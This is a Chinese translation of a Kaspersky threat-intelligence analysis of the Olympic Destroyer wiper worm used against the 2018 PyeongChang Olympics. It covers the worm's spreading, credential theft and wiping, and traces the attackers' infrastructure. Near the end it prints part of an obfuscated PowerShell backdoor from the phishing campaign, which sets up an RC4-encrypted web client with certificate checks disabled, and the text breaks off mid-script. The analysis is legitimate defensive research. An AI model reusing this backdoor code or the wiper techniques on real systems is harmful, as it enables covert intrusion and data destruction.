# 迷雾中的Olympic Destroyer
|
##### 译文声明
本文是翻译文章，文章原作者 GReAT，文章来源：securelist.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
今年的冬奥会在韩国平昌举行，开幕式后过几天，我们从多个合作伙伴那收到了几份秘密信息（TLP等级Red），内容涉及针对奥运基础设施的恶意攻击活动。快速分析这款恶意软件后，我们发现这是一款具备破坏功能、自我修改功能、密码窃取功能以及自主传播功能的恶意程序，不管从哪个角度来看，这听起来都是非常糟糕的一件事。
根据媒体的[报道](https://www.wired.com/story/olympic-destroyer-malware-pyeongchang-opening-ceremony/)，平昌奥运会的组织者[证实](https://www.theguardian.com/sport/2018/feb/10/winter-olympics-investigating-if-technical-problems-were-cyber-attack)他们正在调查一起网络攻击事件，此次攻击导致IT系统在开幕式正式开始前处于瘫痪状态，显示器被关闭、Wi-Fi停止服务，同时奥运官网也无法正常工作，以致游客无法打印门票。我们还发现了针对其他公司的攻击活动，其任务是摧毁这些目标公司。
## 二、恶意软件功能
在攻击当天，与此次网络攻击相关的几个文件已经被上传到VirusTotal上，其他安全研究人员也及时跟踪到这一情况。在我们研究此次攻击事件时，思科的Talos团队[发布](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)了关于该恶意软件的简要说明（Talos通过未公开渠道获取了这款软件）。在Talos的博客中，他们标出了这款恶意软件与Netya（[Expetr/NotPetya](https://securelist.com/expetrpetyanotpetya-is-a-wiper-not-ransomware/78902/)）以及[BadRabbit](https://securelist.com/bad-rabbit-ransomware/82851/)（勒索软件）的一些相似之处。
Talos的公开文章成功解除了这些信息所附带的TLP限制，现在相关信息已对外公布，大家可以通过各种渠道了解这些细节。然而，我们认为不应该那么早下结论，特别是此次攻击活动的追踪溯源问题。我们需要多花些时间，静下心来好好研究，继续挖掘恶意软件中的虚假标志以及争议信息。
攻击所使用的主恶意软件模块是一款网络蠕虫，由多个组件组成，包括SysInternals中的合法PsExec工具、一些凭据窃取模块以及数据擦除模块（wiper）。从技术角度来看，恶意软件的目的是传播并启动wiper载荷，在接下来的60分钟内销毁远程网络共享上的文件。同时，主模块会从浏览器以及Windows存储数据中收集用户密码，生成包含历史凭据以及新收集凭据的新版蠕虫。新生成的蠕虫会推送到可达的本地网络主机上，利用收集到的凭据以及当前的用户权限，通过PsExec工具开展攻击。
一旦wiper的运行时长达到了60分钟，它就会清除文件系统中的Windows事件日志、重置备份数据、删除卷影副本（shadow
copy），也会禁用Windows启动菜单中的recovery选项、禁用系统上的所有服务然后重启电脑，同时恶意软件如果能访问网络共享，也会在60分钟后删除这些文件。恶意软件并没有使用任何本地持久化技术，也不包含避免重复感染的保护机制。顺便提一下，对于远程文件，只有1M大小的文件会被完全覆盖（用零填充），大文件只有前1K个字节会被零覆盖。本地文件并不会被删除，蠕虫也不会删除自己或者自己的组件。
图1. OlympicDestroyer各组件之间的关系
## 三、侦察阶段
已经有许多公司发表过Olympic
Destroyer的相关研究文章，内容涉及攻击事件的追踪溯源、恶意软件功能以及传播方式，但还没有人发现这款恶意软件的启动方式以及具体来源，这一方面我们的运气不错，有点研究成果。
从2017年12月以来，安全研究人员观察到有些钓鱼邮件样本中的MS
Office文档被上传到VirusTotal上，这些钓鱼邮件都与冬奥会有关。文档内容不多，只包含一些乱码文本，让用户误以为文档编码存在问题，诱导用户按下“启用内容（Enable
Content）”按钮。
图2. 钓鱼邮件中的文档示例
当受害者点击该按钮后，钓鱼文档会使用命令行启动`cmd.exe`，执行PowerShell脚本，最终在目标系统中植入后门。攻击目标是这种邮件攻击活动与Olympic
Destroyer之间较为明显的唯一联系，然而我们发现这个文档与针对平昌的攻击事件存在各种联系，因此将这两起攻击事件关联在一起。
在攻击事件调查过程中，我们的分析人员获得了官方授权，可以以管理员权限访问受攻击影响的某台服务器，这台服务器位于平昌的某家酒店内。我们对这台Windows服务器做了归类分析。受影响的公司也非常支持我们的工作，为我们提供了来自网关的网络连接日志。在这些条件下，我们确认恶意攻击流量来自于`131.255.*.*`这个IP地址，该地址归属地为阿根廷，承载了攻击有关的恶意命令以及控制服务器功能。被感染的主机会与这台服务器建立多个连接，服务器开放的端口如下所示：
    443
    4443
    8080
    8081
    8443
    8880
攻击者从保加利亚的某家销售公司那购买了这台阿根廷服务器，这家公司也为我们的调查研究提供了许多帮助。该公司表示，攻击者从挪威购买了这台服务器，使用的是Protomail邮箱账户。
具体信息如下：
    姓名： Simon ***
    邮箱： simon***@protonmail.com
    最近登录日期： 2018-02-07 16:09
    登录IP： 82.102.*.* (Norway)
    服务器购买日期： 2017-10-10
后面我们又进一步将这些信息与某个可疑的域名联系起来，该域名的注册地址以及电话号码归属于瑞典，具体信息如下：
    域名 microsoft******[.]com
    注册名： Elvis ****
    邮箱： elvis***@mail.com
    注册日期： 2017-11-28
2017年12月份，这个域名没有通过ICANN的邮箱验证，因此被暂停服务，在此之前，域名处于隐私保护状态。许多域名信息对外屏蔽，但我们可以看到该域名所使用的DNS服务器信息，了解到攻击者通过MonoVM购买了这个域名（MonoVM是支持比特币支付的VPS服务商）：
    域名服务器： monovm.earth.orderbox-dns[.]com
    域名服务器： monovm.mars.orderbox-dns[.]com
    域名服务器： monovm.mercury.orderbox-dns[.]com
    域名服务器： monovm.venus.orderbox-dns[.]com
域名服务器变更历史如下图所示：
图3. `microsoft*****.com`域名服务器的历史变更记录
这个邮件地址是某个小型网络的联系地址，位于 **89.219.*.***
这个大网段中，该网络的归属地为哈萨克斯坦，目前我们只能跟踪到这里。现在我们还不能透露完整信息，避免这个联系地址发生变动，希望大家能够理解这一点。我们已经将完整信息提供给执法部门以及订阅我们的APT情报服务的客户。
为了管理位于阿根廷的这台服务器，`Simon
***`使用了位于挪威境内的一个IP地址（`82.102.*.*`）。这个地址是NordVPN（）服务商所使用的网关地址，该服务商支持比特币支付，可以提供隐私保护的VPN服务。
在以往的攻击活动中，我们也曾见过NordVPN这个名字。之前我们发现过攻击者在钓鱼邮件中用到了一份武器化的Word文档，当时的攻击目标也是冬奥会，文档中包含一些垃圾文本，这些文本看起来貌似源自于某个二进制对象（比如页面文件或者原始磁盘数据）。然而，这些随机数据中包含两个可读的文本字符串（如下图红色方框所示），这些字符串在文档中（文档的MD5值为`5ba7ec869c7157efc1e52f5157705867`）并没有什么特别含义：
图4. 钓鱼文档中出现的openvpn配置文件信息
当然这个证据并不是特别充分，但还是能给我们提供一些线索，表明针对冬奥会的钓鱼攻击组织与推出Olympic
Destroyer蠕虫的攻击者之间存在一定联系。此外，该文档中还包含一条PowerShell命令，与Olympic
Destroyer受害者网络中发现的PowerShell后门非常相似。这两份代码的对比如下所示。
如下列出的两份PowerShell脚本既可以用在武器化的文档中，也可以用作单独的后门。作为单独的无文件（fileless）后门，这两个脚本都采用了相同的工具来构建以及混淆处理，都使用了相似的URL结构，都在PowerShell中采用了RC4算法，也都将密钥通过base64编码后，嵌入cookie字段发送给服务器。
针对韩国的钓鱼攻击所使用的PowerShell载荷如下所示：
    (  gCi VariABLE:FzS3AV  ).”VaLUE”::”expecT100cOnTiNUe”=0;
     ${wC}=^&NEW-ObjecT System.Net.Webclient;${u}=Mozilla/5.0 (Windows NT 6.1;WOW64; Trident/7.0; rv:11.0)like Gecko;
     (  GCI VARiabLe:fZS3aV ).”vAlUe”::”seRVeRCeRTiFICaTEVALIDATIoNCALlbAck” = {${tRUE}};
     ${wC}.”hEADERs”.Add.Invoke(User-Agent,${U});
     ${WC}.”PROXy”=  ( variaBLe  (“fX32R”) -VAlUeO )::”DefaultWebProxy”;
     ${wc}.”pRoxY”.”CREdENtials” =  ( GET-vaRiABle (‘hE7KU’)).”VAlue”::”dEFauLTNeTWOrkCREdENTIALs”;
     ${K}=  $XNLO::”asCiI”.GetBytes.Invoke(5e2988cfc41d844e2114dceb8851d0bb);
     ${R}=
     {
      ${D},${K}=${ArGs};
      ${s}=0..255;0..255^|^&(‘%’)
      {
        ${j}=(${j}+${s}[${_}]+${k}[${_}%${K}.”couNt”])%256;
        ${s}[${_}],${S}[${J}]=${s}[${J}],${S}[${_}]
      };
      ${d}^|^&(‘%’)
      {
        ${I}=(${I}+1)%256;
        ${h}=(${H}+${s}[${I}])%256;
        ${S}[${I}],${s}[${H}]=${s}[${H}],${S}[${I}];